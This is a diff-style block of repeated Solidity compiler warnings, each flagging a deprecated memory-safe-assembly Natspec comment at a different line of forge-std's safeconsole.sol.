+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:651:9:
+    |
+651 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:668:9:
+    |
+668 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:681:9:
+    |
+681 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:695:9:
+    |
+695 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:708:9:
+    |
+708 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:722:9:
+    |
+722 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:735:9:
+    |
+735 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:751:9:
+    |
+751 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:774:9:
+    |
+774 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:790:9:
+    |
+790 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:803:9:
+    |
+803 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:817:9:
+    |
+817 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:830:9:
+    |
+830 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:844:9:
+    |
+844 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:857:9:
+    |
+857 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:873:9:
+    |
+873 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:896:9:
+    |
+896 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:912:9:
+    |
+912 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:925:9:
+    |
+925 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:939:9:
+    |
+939 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:952:9:
+    |
+952 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:966:9:
+    |
+966 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:979:9:
+    |
+979 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:995:9:
+    |
+995 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1018:9:
+     |
+1018 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1036:9:
+     |
+1036 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1059:9:
+     |
+1059 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1077:9:
+     |
+1077 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1100:9:
+     |
+1100 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1118:9:
+     |
+1118 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1141:9:
+     |
+1141 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1161:9:
+     |
+1161 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1187:9:
+     |
+1187 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1205:9:
+     |
+1205 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1218:9:
+     |
+1218 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1232:9:
+     |
+1232 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1245:9:
+     |
+1245 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1259:9:
+     |
+1259 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1272:9:
+     |
+1272 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1288:9:
+     |
+1288 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1311:9:
+     |
+1311 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1327:9:
+     |
+1327 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1340:9:
+     |
+1340 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1354:9:
+     |
+1354 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1367:9:
+     |
+1367 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1381:9:
+     |
+1381 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1394:9:
+     |
+1394 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1410:9:
+     |
+1410 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1433:9:
+     |
+1433 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1449:9:
+     |
+1449 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1462:9:
+     |
+1462 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1476:9:
+     |
+1476 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1489:9:
+     |
+1489 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1503:9:
+     |
+1503 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1516:9:
+     |
+1516 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1532:9:
+     |
+1532 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1555:9:
+     |
+1555 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1573:9:
+     |
+1573 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1596:9:
+     |
+1596 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1614:9:
+     |
+1614 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1637:9:
+     |
+1637 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1655:9:
+     |
+1655 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1678:9:
+     |
+1678 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1698:9:
+     |
+1698 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1724:9:
+     |
+1724 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1742:9:
+     |
+1742 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1755:9:
+     |
+1755 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1769:9:
+     |
+1769 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1782:9:
+     |
+1782 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1796:9:
+     |
+1796 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1809:9:
+     |
+1809 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1825:9:
+     |
+1825 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1848:9:
+     |
+1848 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1864:9:
+     |
+1864 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1877:9:
+     |
+1877 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1891:9:
+     |
+1891 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1904:9:
+     |
+1904 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1918:9:
+     |
+1918 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1931:9:
+     |
+1931 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1947:9:
+     |
+1947 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1970:9:
+     |
+1970 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1986:9:
+     |
+1986 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1999:9:
+     |
+1999 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2013:9:
+     |
+2013 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2026:9:
+     |
+2026 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2040:9:
+     |
+2040 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2053:9:
+     |
+2053 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2069:9:
+     |
+2069 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2092:9:
+     |
+2092 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2110:9:
+     |
+2110 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2133:9:
+     |
+2133 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2151:9:
+     |
+2151 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2174:9:
+     |
+2174 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2192:9:
+     |
+2192 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2215:9:
+     |
+2215 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2235:9:
+     |
+2235 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2261:9:
+     |
+2261 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2281:9:
+     |
+2281 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2304:9:
+     |
+2304 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2322:9:
+     |
+2322 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2345:9:
+     |
+2345 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2363:9:
+     |
+2363 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2386:9:
+     |
+2386 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2406:9:
+     |
+2406 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2432:9:
+     |
+2432 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2452:9:
+     |
+2452 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2475:9:
+     |
+2475 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2493:9:
+     |
+2493 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2516:9:
+     |
+2516 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2534:9:
+     |
+2534 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2557:9:
+     |
+2557 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2577:9:
+     |
+2577 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
